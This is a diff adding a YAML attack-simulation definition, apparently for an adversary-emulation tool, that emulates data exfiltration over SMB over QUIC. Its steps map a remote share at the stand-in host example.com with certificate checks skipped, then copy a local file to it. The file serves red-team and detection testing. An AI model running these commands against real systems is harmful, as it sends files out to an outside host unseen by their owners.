@@ -1,0 +1,33 @@
+api_version: "2.0"
+name: Exfiltration Over SMB over QUIC (NET USE)
+description: |
+    Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.
+    Prerequisites:
+      - A file server running Windows Server 2022 Datacenter: Azure Edition
+      - A Windows 11 computer
+      - Windows Admin Center
+args:
+    - name: remote_path
+      type: string
+      default: \\example.com\sales
+    - name: local_file
+      type: path
+      default: C:\path\to\file.txt
+uuid: 183235ca-8e6c-422c-88c2-3aa28c4825d9
+mitre:
+    tactics:
+        - 'TA0008: Lateral Movement'
+    techniques:
+        - 'T1570: Lateral Tool Transfer'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: exfiltration-over-smb-over-quic-(net-use)
+      inline: |
+        NET USE * '{{.Args.remote_path}}' /TRANSPORT:QUIC /SKIPCERTCHECK
+        copy '{{.Args.local_file}}' '*:\'
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
